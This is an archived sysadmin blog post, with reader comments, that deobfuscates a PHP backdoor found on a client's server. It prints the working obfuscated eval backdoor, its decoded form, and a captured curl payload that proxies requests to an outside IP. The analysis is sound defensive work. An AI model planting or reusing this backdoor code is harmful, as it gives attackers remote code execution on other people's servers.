---
layout: post
status: publish
published: true
title: Unobfuscating an Attack
author_login: admin
author_email: github@laudicina.net
wordpress_id: 145
wordpress_url: http://alanp.ca/blog/?p=145
date: '2010-07-13 09:20:33 -0400'
date_gmt: '2010-07-13 13:20:33 -0400'
categories:
- Software
- System Administration
tags:
- php
- obfuscated
- hack
- hacker
- curl
- sysadmin
comments:
- id: 2124
  author: 'wp-popular.com &raquo; Blog Archive &raquo; Unobfuscating an Attack &laquo;
    alanp.ca : blog'
  author_email: ''
  author_url: http://wp-popular.com/popular-word-press-websites/unobfuscating-an-attack-%c2%ab-alanp-ca-blog/
  date: '2010-07-25 04:51:35 -0400'
  date_gmt: '2010-07-25 08:51:35 -0400'
  content: "[...] post: Unobfuscating an Attack &laquo; alanp.ca : blog Tags: code,
    hack, [...]"
- id: 2159
  author: Erin
  author_email: webkitech@gmail.com
  author_url: ''
  date: '2011-05-17 14:52:00 -0400'
  date_gmt: '2011-05-17 14:52:00 -0400'
  content: "&nbsp;This just happened to my wordpress account. I don't know much about
    hacks or viruses. I deleted the file (it overtook my style.css file). Is the problem
    solved now or should I take further action? Thanks!"
- id: 2226
  author: Xavier Schott
  author_email: xschott@gmail.com
  author_url: ''
  date: '2011-10-30 23:23:00 -0400'
  date_gmt: '2011-10-31 03:23:00 -0400'
  content: |-
    There are immediate actions you must take when you isolate an attack. The file which led to the infection likely multiplied itself in a few locations.

    As described in this article:
    http:&#47;&#47;thegothicparty.com&#47;dev&#47;article&#47;server-side-virus-rat&#47;

    you should take serious steps in not only identifying other potential backdoors or RAT, but also tighten the security on your server, starting with ensuring that absolutely no directory is writable, and your WordPress is up-to-date. There are known plug-in security holes, and your first line of response is robust, recent software.
---
![](http://alanp.ca/blog/wp-content/uploads/2010/07/chomp.png "Chomp Chomp, Hackers be biting your computar.") Having experienced some 'weird' traffic the other day, a client contacted me regarding this problem. One of the datacenters we deal with contacted my client and sent him the following logs from an attack that seems to occured from his server:

```apache
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:03 +0000] "GET /wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:03 +0000] "GET /old/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:04 +0000] "GET /cms/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:04 +0000] "GET /wp-login.php HTTP/1.1" 404 2537 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:05 +0000] "GET /wp-login.php HTTP/1.1" 404 2538 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:05 +0000] "GET /blog/wp-login.php HTTP/1.1" 404 2537 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:06 +0000] "GET /blog/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:06 +0000] "GET /blog_old/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:06 +0000] "GET /blog-old/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:07 +0000] "GET /blog/wp/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
```

Obviously, the IPs have been removed to protect the innocent. What we can see from this log output is that there is an obvious scan of hackable Wordpress installations happening -- and they look to come from our server.

After some further inspection of the server, it looks as if an 'attacker' uploaded a PHP file to their account and was now using it to scour the internet for hackable Wordpress installs. A remote machine would send requests to a group of servers hosting this PHP file:

```php
$_fcxxxcc="\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";
$_fcxxxcc("\x7c\x2e\x7c\x65","\x65\x76\x61\x6c\x28\x27\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x22aWYobWQ1KCRfU0VSVkVSWydIVFRQX1FVT1RFJ10pPT0nZTY2ZTZjYWRkNmUxM2VmZWE1NGVkNTBjMGViMmQzMmInIGFuZCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0NPREUnXSkpIEBldmFsKEBiYXNlNjRfZGVjb2RlKHN0cnJldihAJF9TRVJWRVJbJ0hUVFBfWF9DT0RFJ10pKSk7\x22\x29\x29\x3b\x27\x29",'.');
```

I have to give it to them, at least they obfuscated the code. It took a while before I realized the extent of their hidden code. Unobfuscating this file gives us:

```php
$_fcxxxcc="preg_replace";
preg_replace("|.|e","eval('eval(base64_decode("aWYobWQ1KCRfU0VSVkVSWydIVFRQX1FVT1RFJ10pPT0nZTY2ZTZjYWRkNmUxM2VmZWE1NGVkNTBjMGViMmQzMmInIGFuZCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0NPREUnXSkpIEBldmFsKEBiYXNlNjRfZGVjb2RlKHN0cnJldihAJF9TRVJWRVJbJ0hUVFBfWF9DT0RFJ10pKSk7"));')",'.')
```

Base 64 decoding this string gives us:

```php
if(md5($_SERVER['HTTP_QUOTE'])=='e66e6cadd6e13efea54ed50c0eb2d32b'  and isset($_SERVER['HTTP_X_CODE']))
    @eval(@base64_decode(strrev(@$_SERVER['HTTP_X_CODE'])));
```
Finally, we're getting somewhere!

Brief inspection of this code shows that the attackers are sending a payload which gets interpreted by the local system. But, what kind of payload are they sending to their script? Since this file was being called quite periodically, dumping the information to a text file gives us all of the information we are looking for. After a day, I came back to check on the script to find payload that looks like this (decoding and comments by me):

```php
header("X_GZIP: TRUE");
header("X_MD5: 8b72825b0b211b07f8378013cbfb0d17");
error_reporting(E_ALL); ini_set("display_errors",1); $cr=curl_init();
curl_setopt($cr, 13, unserialize(base64_decode("aToxNTs="))); // i:15;
curl_setopt($cr, 19913, unserialize(base64_decode("czoxOiIxIjs="))); // s:1:"1";
curl_setopt($cr, 42, unserialize(base64_decode("czoxOiIxIjs="))); // s:1:"1";
curl_setopt($cr, 53, unserialize(base64_decode("czoxOiIwIjs="))); // s:1:"1";
curl_setopt($cr, 52, unserialize(base64_decode("aTowOw=="))); // i:0;
curl_setopt($cr, 19914, unserialize(base64_decode("czoxOiIxIjs="))); // s:1:"1";
curl_setopt($cr, 64, unserialize(base64_decode("czoxOiIwIjs="))); // s:1:"1";
curl_setopt($cr, 81, unserialize(base64_decode("czoxOiIwIjs="))); // s:1:"1";
curl_setopt($cr, 10023, unserialize(base64_decode("YTo5OntpOjA7czoxMToiQWNjZXB0OiAqLyoiO2k6MTtzOjIyOiJBY2NlcHQtTGFuZ3VhZ2U6IGVuLXVzIjtpOjI7czoyMjoiQ29ubmVjdGlvbjoga2VlcC1hbGl2ZSI7aTozO3M6MTIwOiJVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBBVCZUIENTTTcuMDsgWVBDIDMuMi4wOyAuTkVUIENMUiAxLjEuNDMyMjsgeXBsdXMgNS4xLjA0YikiO2k6NDtzOjg6IkV4cGVjdDogIjtpOjU7czoxNzoiQWNjZXB0LUVuY29kaW5nOiAiO2k6NjtzOjE1OiJLZWVwLUFsaXZlOiAxMTUiO2k6NztzOjg6IkNvb2tpZTogIjtpOjg7czoxNDk6IlJlZmVyZXI6IGh0dHA6Ly90cmFuc2xhdGUuZ29vZ2xlLmNvbS90cmFuc2xhdGU/aGw9ZW4mc2w9ZW4mdGw9ZnImdT1odHRwJTNBJTJGJTJGODkuMTQ5LjI0Mi4xMjIlMkZkYXRhJTJGMjk1NjA5M185M2NmODdjNGM1NGFlNjVjNjc0ZTlkOWJjOTQ3NjU3OS5odG1sIjt9")));
/* a:9:{i:0;s:11:"Accept: */*";i:1;s:22:"Accept-Language: en-us";i:2;s:22:"Connection: keep-alive";i:3;s:120:"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AT&amp;T CSM7.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.04b)";i:4;s:8:"Expect: ";i:5;s:17:"Accept-Encoding: ";i:6;s:15:"Keep-Alive: 115";i:7;s:8:"Cookie: ";i:8;s:149:"Referer: http://translate.google.com/translate?hl=en&amp;sl=en&amp;tl=fr&amp;u=http%3A%2F%2F89.149.242.122%2Fdata%2F2956093_93cf87c4c54ae65c674e9d9bc9476579.html";} */
curl_setopt($cr, 10102, unserialize(base64_decode("czowOiIiOw=="))); // s:0:"";
curl_setopt($cr, 47, unserialize(base64_decode("aTowOw=="))); // i:0;
curl_setopt($cr, 10002, unserialize(base64_decode("czoxNDA6Imh0dHA6Ly90cmFuc2xhdGUuZ29vZ2xlLmNvbS90cmFuc2xhdGU/aGw9ZW4mc2w9ZW4mdGw9ZnImdT1odHRwJTNBJTJGJTJGODkuMTQ5LjI0Mi4xMjIlMkZkYXRhJTJGMjk1NjA5M185M2NmODdjNGM1NGFlNjVjNjc0ZTlkOWJjOTQ3NjU3OS5odG1sIjs=")));
// s:140:"http://translate.google.com/translate?hl=en&amp;sl=en&amp;tl=fr&amp;u=http%3A%2F%2F89.149.242.122%2Fdata%2F2956093_93cf87c4c54ae65c674e9d9bc9476579.html";
$response=curl_exec($cr);
$md5_error=md5("error");$md5_content=md5("content");$md5_info=md5("info");
if(is_bool($response) and $response == false) {
    echo "&lt;$md5_error&gt;".curl_errno($cr)."|".curl_error($cr)."";
    exit;
}
echo "&lt;$md5_info&gt;".serialize(curl_getinfo($cr))."";
if(function_exists("gzdeflate") and base64_encode(gzdeflate(md5("time"),9))=="MzBPTjazNEmyTDJOSzYzNjM3NEhLNLBIMrM0Mko2MUoCAA=="){
    $response="GZIP|".base64_encode(gzdeflate($response,9));
}
echo "&lt;$md5_content&gt;$response";
exit;
```

The definition of the curl_setopt call is as follows:

`bool curl_setopt ( resource $ch , int $option , mixed $value )`

Let's break down all of the Curl options we are setting here. Even the [curl_setopt](http://php.net/manual/en/function.curl-setopt.php) calls are obfuscated in the xcode that we receive, using the integer value instead of the constants:

*   Option 13 (**CURLOPT_TIMEOUT** => 15): Sets the timeout for the Curl request to 15 seconds.
*   Option 19913 (**CURLOPT_RETURNTRANSFER** => "1"): Returns the value of [curl_exec](http://www.php.net/manual/en/function.curl-exec.php) as a string.
*   Option 42 (**CURLOPT_HEADER** => "1"): Includes the header in the output.
*   Option 53 (**CURLOPT_TRANSFERTEXT** => "1"): Uses ASCII mode for FTP transfers.
*   Option 52 (**CURLOPT_FOLLOWLOCATION** => 0): Does not follow 'Location:' header fields.
*   Option 19914 (**CURLOPT_BINARYTRANSFER** => "1"): Returns raw output in conjunction with option 19913 (CURLOPT_RETURNTRANSFER)
*   Option 64 (**CURLOPT_SSL_VERIFYPEER** => "1"):Verifiesthe site's SSL certificate to be valid.
*   Option 81 (**CURLOPT_SSL_VERIFYHOST** => "1"): Verifies the correct SSL hostname for the certificate.
*   Option 10023 (**CURLOPT_HTTPHEADER**): Sets the HTTP header sent as follows:
	*   "Accept: */*": Specifies that all media is acceptable for response from the HTTP request
    *   "Accept-Language: en-us": Specifies that we are looking for an English return.
    *   "Connection: keep-alive": Specifies that we want a persistent connection (multiple responses/downloads in one thread of the server essentially).
    *   "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AT&T CSM7.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.04b)": A bogus user agent
    *   "Expect: ": Indicates that no behavior is required by the client.
    *   "Accept-Encoding: ": Indicates that we accept all encoding.
    *   "Keep Alive: 115": Sets a keep-alive timeout of 115.
    *   "Referer: Sets a seemingly bogus referer, although this may be legit in some cases.
*   Option 10102 (**CURLOPT_ENCODING** => ""): If this is set to "", a header that accepts all "Accept Encoding" header values is sent.
*   Option 47 (**CURLOPT_POST** => 0): We are not doing a HTTP post.
*   Option 10002 (**CURLOPT_URL**): Sets the URL to fetch.

It looks like in this case, the attacker was using Google Translate to fetch a website and translate it into another language. In this case, the payload of the attack is not as important as the implications of finding this file and the outcome it could have on your server and the users hosted on it.

I think the moral of the story here is to watch out for what your users may be uploading to your servers.  This two line file essentially turned one of our machines into an open proxy server for whoever was privy to the URL of this script.  It is better to be proactive in searching for these than it is to sit around and wait for a datacenter to give you a ring.  Of course, you can't always find them in time.

**References and Attributions:**

1.  [PHP: curl_setopt](http://php.net/manual/en/function.curl-setopt.php)
2.  [RFC2616: Hypertext Transfer Protocol -- HTTP/1.1](http://www.w3.org/Protocols/rfc2616/rfc2616.html)
3.  Chomped computer image at the top of the article is from the [Tango](http://tango.freedesktop.org/) project, modified by [slady](http://commons.wikimedia.org/wiki/User:Slady).  Licensed under the [Creative Commons](http://creativecommons.org/)-BY-SA-2.5 License.
